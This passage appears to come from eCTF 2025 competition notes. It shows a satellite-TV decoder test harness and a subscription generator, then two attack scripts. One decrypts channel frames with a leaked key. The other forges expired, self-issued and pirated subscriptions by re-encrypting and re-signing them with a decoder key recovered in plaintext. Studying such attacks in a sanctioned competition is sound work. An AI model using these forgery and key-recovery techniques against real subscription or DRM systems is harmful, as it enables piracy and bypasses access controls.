            with open(self.json_path, 'r') as file:
                frames = json.load(file)  # assuming the file contains a list of frames

            for frame in frames:
                timestamp = frame["timestamp"]
                encoded = binascii.a2b_hex(frame["encoded"])
                logger.debug(f"Received encoded ({timestamp}): {encoded}")

                # Decode the frame
                decoded = self.decoder.decode(encoded)

                # Print the decoded frame
                try:
                    # if the frame contains printable text, pretty print it
                    printable = decoded.decode('utf-8')
                    logger.info(f"Decoded Frame:\n{printable}")
                except UnicodeDecodeError:
                    # if we can't decode bytes, fall back to just printing the hexadecimal
                    logger.info(f"Decoded Frame (hex): {decoded.hex()}")

        except FileNotFoundError:
            logger.critical(f"File {self.json_path} not found")
        except json.JSONDecodeError:
            logger.critical("JSON decoding error")
        except Exception as e:
            logger.critical(f"Failed to read from file: {e}")
            raise

def main():
    parser = argparse.ArgumentParser(
        description="Run the TV, pulling frames from a JSON file, decoding using the Decoder, and printing to the terminal",
    )
    parser.add_argument("json_path", help="Path to the JSON file containing frames")
    parser.add_argument("dec_port", help="Serial port to the Decoder")
    parser.add_argument("--baud", type=int, default=115200, help="Baud rate of the serial port")
    args = parser.parse_args()

    tv = TV(args.json_path, args.dec_port, args.baud)
    tv.run()

if __name__ == "__main__":
    main()

```

---

## 11. Generate subscriptions code

```python
import argparse
import json
from pathlib import Path
import struct
from loguru import logger

def gen_subscription(
  device_id: int, start: int, end: int, channel: int
) -> bytes:
    """Generate the contents of a subscription.

    The output of this will be passed to the Decoder using ectf25.tv.subscribe

    :param secrets: Contents of the secrets file generated by ectf25_design.gen_secrets
    :param device_id: Device ID of the Decoder
    :param start: First timestamp the subscription is valid for
    :param end: Last timestamp the subscription is valid for
    :param channel: Channel to enable
    """
    # Pack the subscription. This will be sent to the decoder with ectf25.tv.subscribe
    return struct.pack("<IQQI", device_id, start, end, channel)

def parse_args():
    """Define and parse the command line arguments

    NOTE: Your design must not change this function
    """
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--force",
        "-f",
        action="store_true",
        help="Force creation of subscription file, overwriting existing file",
    )
    parser.add_argument("subscription_file", type=Path, help="Subscription output")
    parser.add_argument(
        "device_id", type=lambda x: int(x, 0), help="Device ID of the update recipient."
    )
    parser.add_argument(
        "start", type=lambda x: int(x, 0), help="Subscription start timestamp"
    )
    parser.add_argument("end", type=int, help="Subscription end timestamp")
    parser.add_argument("channel", type=int, help="Channel to subscribe to")
    return parser.parse_args()

def main():
    """Main function of gen_subscription

    You will likely not have to change this function
    """
    # Parse the command line arguments
    args = parse_args()
    subscription = gen_subscription(
        args.device_id, args.start, args.end, args.channel
    )
    # Print the generated subscription for your own debugging
    # Attackers will NOT have access to the output of this (although they may have
    # subscriptions in certain scenarios), but feel free to remove
    #
    # NOTE: Printing sensitive data is generally not good security practice
    logger.debug(f"Generated subscription: {subscription}")
```

---

## 12. Base64 Encoded Key Attack

```python
from Crypto.Cipher import AES
import struct
import binascii

# Channel keys (first 16 ASCII chars of base64 string)
CHANNEL_KEYS = {&
    2: "y0wAcS9KdyUrfc+GlT9zDQ==".encode('ascii')[:16]  # Key: b'DNfhhXMeWtMj6CL'
}

def decrypt_packet(packet_hex):
    raw = binascii.unhexlify(packet_hex)
    
    # Extract components
    nonce = raw[:12]
    header = raw[12:24]
    ciphertext = raw[24:-16]
    tag = raw[-16:]
    
    # Parse header
    channel, timestamp = struct.unpack("<IQ", header)
    
    # Get key
    key = CHANNEL_KEYS.get(channel)
    if not key:
        return f"No key for channel {channel}"
    
    # Decrypt
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    cipher.update(header)  # Authenticate header
    
    try:
        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
        return plaintext.split(b'\x00')[0].decode()  # Remove padding
    except ValueError as e:
        return f"Decryption failed: {e}"

# Your packet
#packet_hex = "a4c4176c67398dbe2658ac290400000019e67486a0a706003f92530031b9f86da628425c002380310d7f6d37ee6fdb8eeaa9bfeb73c27b40daacc336bcebcbdc44c3a7b8be579092a8f2d4d0ab2db56ad69e3d95bcb6ff6a948b6d262921cbb47fd7d5c6506fca83"
#packet_hex = "18afadda9fbdce99e5ba8de401000000ef2ce6bb5457000080961b553279aa58ab9cbc58b5da98f8fb186fa63b4ce92b745aa0c1d537b213e2e6fedc0170a50fce5f81aa2aa9374ac3a05a2b79c767f871f8e582458b9044ca5c2cb2680c4d81b5d3a544068e9933"
#packet_hex = "53d5200d596aca9949152a86030000007101b2aca0a706001823671c47f326521b8d5a6c6163320da67a9bc3c85e27fe2d6be979a66cace22ae4daf51516245b5ba1bedd31d4624ab38ed32b5abeb17dd5850ca19949cc04e9e65e6fd1469abe538b25af6f9561c7"
packet_hex = "af68d9002665bfd25b5ee88802000000cb13efb0a0a70600ec3e6258a2986a1c7ded15bc0fcdff0abc97c5654bb22404a24c3f174ad8bd8b534610a30469e70c0e9930f09ac9b51814428063774c6587cfcbca567cf4a34e74bea8fb0b51a56acb86ffa5f3c9e1b8"
result = decrypt_packet(packet_hex)
print(f"Decrypted: {result}")

```
---

## 13. MITM from plaintext key attack

```python
import struct
import hashlib
import hmac
from Crypto.Cipher import AES

# Change to correct attack type
attack_type = "own"  # choose: "expired", "own", "pirated"

# decoder main key found in plain text
decoder_key = bytes.fromhex("4e550cc31ccd8e38e07c51fa47a8da068563f7f7cf5258841cdde11370dc0bf8")

# Original subscription packets
original_packets = {
    "expired": "14693bb838e0fd9dbe56ae964540237b4b7e9fd683c23c405e2e1505bc36496d1986e17d3a4d2ed2c6ce6208700ae60aa99bdae1fda4350285bcc30247bdeabc6adfdb6d05b8f5e0631c2a51f5ab26fed00da9f9a97932c2a62ccd4333587c19658f599388953948a873917ac4bb9a340000000000000000",
    "own":     "4e036c20544e55b710f39155d0799e71e4f5b9c6c4b315df5465967111ff9fc7b67684e823cf01a94590a320573fc0320b3e3afb95760c3bdc4a01463edb8e3d1ff83393648aa3eefd9de609f80930c9a5fed18f5c08794fe7ab6f21f09131dc25f0dc20887856ac36d0c99ac65b93d90000000000000000",
    "pirated": "b8ddbd6060047ffa7c74580cd2a23526e0ef35e05beaa061bd8913981d3374a1c0b56704076bc58e983aca594a704dabb50733e54de09a4943689684e4cb2f1d7529b081d22620f4d82b47a363f2286fc7ef805c2c5bf993848c44cbafd002d290b5c1a0870e999e7e1953a3c7d7924d0000000000000000"
}

# Device ID used to decrypt the original packet (the actual device the sub came from)
original_device_ids = {
    "expired": 0x2b7a45db,
    "own":     0x6e9c95e8,
    "pirated": 0x0c37c4bb
}

# Modifications based on attack type
modifications = {
    "expired": {
        "new_end": 407307713553633,
        "new_start": None,
        "new_device_id": None
    },
    "own": {
        "new_start": 107307713553633,
        "new_end": None,
        "new_device_id": None
    },
    "pirated": {
        "new_device_id": 0xfc045cdc,
        "new_start": None,
        "new_end": None
    }
}

output_file = f"modified_{attack_type}.sub"
new_iv = None  # Set to None to reuse original IV

# === SCRIPT ===

def modify_packet():
    original_packet = original_packets[attack_type]
    original_device_id = original_device_ids[attack_type]
    mod = modifications[attack_type]

    packet_bytes = bytes.fromhex(original_packet)
    original_sig = packet_bytes[:32]
    original_iv = packet_bytes[32:48]
    encrypted_payload = packet_bytes[48:112]

    # Decrypt with original key
    key_old = hashlib.sha256(decoder_key + original_device_id.to_bytes(4, 'big')).digest()
    cipher = AES.new(key_old, AES.MODE_CBC, iv=original_iv)
    decrypted = cipher.decrypt(encrypted_payload)

    # Unpack fields
    channel, start, end, dev_id, ch_key, padding = struct.unpack("<IQQI32s8s", decrypted)

    # Apply modifications
    if mod["new_start"] is not None:
        start = mod["new_start"]
    if mod["new_end"] is not None:
        end = mod["new_end"]
    if mod["new_device_id"] is not None:
        dev_id = mod["new_device_id"]

    # Repack modified payload
    modified_payload = struct.pack("<IQQI32s8s", channel, start, end, dev_id, ch_key, padding)

    # IV logic
    iv = new_iv if new_iv else original_iv

    # Encrypt with new device ID key
    key_new = hashlib.sha256(decoder_key + dev_id.to_bytes(4, 'big')).digest()
    cipher = AES.new(key_new, AES.MODE_CBC, iv=iv)
    new_encrypted = cipher.encrypt(modified_payload)

    # New HMAC
    h = hmac.new(key_new, digestmod=hashlib.sha256)
    h.update(iv)
    h.update(new_encrypted)
    new_sig = h.digest()

    # Write to file
    with open(output_file, "wb") as f:
        f.write(new_sig)
        f.write(iv)
        f.write(new_encrypted)

    print(f"\n {output_file} written!")
    print(f" - New signature: {new_sig.hex()[:32]}...")
    print(f" - Device ID: {hex(dev_id)}")
    print(f" - Start: {start}")
    print(f" - End: {end}")
    print(f" - IV: {iv.hex()}")

modify_packet()
 
```
